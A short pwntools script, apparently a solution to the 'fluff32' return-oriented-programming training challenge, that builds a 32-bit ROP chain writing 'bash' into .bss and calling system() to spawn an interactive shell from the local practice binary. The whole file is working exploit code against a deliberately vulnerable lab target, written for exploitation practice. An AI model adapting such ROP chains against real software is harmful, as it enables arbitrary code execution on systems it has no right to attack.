#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

null = p32(0x0)
rop = cyclic(44)
rop += p32(0x8048671)           # xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
rop += null
rop += p32(0x80483e1)           # pop ebx ; ret
rop += p32(0x804a040)           # .bss
rop += p32(0x804867b)           # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
rop += null
rop += p32(0x80483e1)           # pop ebx ; ret
rop += 'bash'
rop += p32(0x8048689)           # xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
rop += null
rop += p32(0x8048671)           # xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
rop += null
rop += p32(0x804867b)           # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
rop += null
rop += p32(0x8048693)           # mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
rop += null * 2
rop += p32(0x8048430)           # system
rop += cyclic(4)                # return address
rop += p32(0x804a040)           # .bss ['bash']

p = process('./fluff32')
p.sendline(rop)
p.interactive()
